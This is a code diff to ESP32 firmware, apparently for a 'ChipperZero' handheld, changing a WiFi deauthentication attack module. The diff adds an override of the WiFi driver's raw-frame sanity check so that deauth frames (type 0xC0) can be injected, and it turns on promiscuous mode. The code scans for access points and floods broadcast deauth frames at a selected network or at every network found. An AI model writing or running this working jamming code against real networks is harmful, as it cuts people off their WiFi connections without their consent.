@@ -8,6 +8,10 @@
 
 #include "../hal/encoder.h"
 
+// Override the WiFi blob's frame-type sanity check so 0xC0 (deauth) is allowed.
+// Requires "-Wl,-z,muldefs" in platformio.ini build_flags.
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
+
 DeauthModule g_wifiDeauth;
 
 namespace {
@@ -23,7 +27,6 @@ static APEntry s_aps[32];
 static uint8_t s_apCount = 0;
 
 static void sendDeauth(const uint8_t* bssid, uint8_t channel) {
-    // Frame: DA=broadcast, SA=bssid, BSSID=bssid, reason=2 (prev auth invalid)
     uint8_t frame[26] = {
         0xC0,0x00, 0x3A,0x01,
         0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
@@ -35,7 +38,7 @@ static void sendDeauth(const uint8_t* bssid, uint8_t channel) {
     memcpy(&frame[10], bssid, 6);
     memcpy(&frame[16], bssid, 6);
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    delay(1);  // let the PHY settle on the new channel before injecting
+    delay(1);
     for (int j = 0; j < 10; j++)
         esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
 }
@@ -61,7 +64,6 @@ void deauthTask(void* arg) {
     const bool targeted = (self->state_ == DeauthState::SCANNING);
     char buf[48];
 
-    // --- Scan ---
     self->setStatus("Scanning APs...");
     s_apCount = scanAPs();
     self->setApCount(s_apCount);
@@ -74,10 +76,12 @@ void deauthTask(void* arg) {
         return;
     }
 
+    // Start AP interface on channel 1 (will be changed per-target by sendDeauth)
     WiFi.mode(WIFI_AP);
-    WiFi.softAP("ChipperZero", nullptr, 1, 0, 1);
+    WiFi.softAP("ChipperZero", nullptr, 1, 1, 1);
+    delay(100);
+    esp_wifi_set_promiscuous(true);
 
-    // --- Select (targeted only) ---
     if (targeted) {
         self->state_ = DeauthState::SELECTING;
         while (self->isRunning() && self->state_ == DeauthState::SELECTING) {
@@ -88,6 +92,7 @@ void deauthTask(void* arg) {
             vTaskDelay(pdMS_TO_TICKS(200));
         }
         if (!self->isRunning()) {
+            esp_wifi_set_promiscuous(false);
             WiFi.mode(WIFI_OFF);
             self->clearTask();
             vTaskDelete(nullptr);
@@ -95,7 +100,6 @@ void deauthTask(void* arg) {
         }
     }
 
-    // --- Attack ---
     self->state_ = DeauthState::ATTACKING;
     uint8_t idx = 0;
     uint8_t sel = self->scroll_ < s_apCount ? self->scroll_ : 0;
@@ -119,6 +123,7 @@ void deauthTask(void* arg) {
         vTaskDelay(1);
     }
 
+    esp_wifi_set_promiscuous(false);
     WiFi.mode(WIFI_OFF);
     self->clearTask();
     vTaskDelete(nullptr);
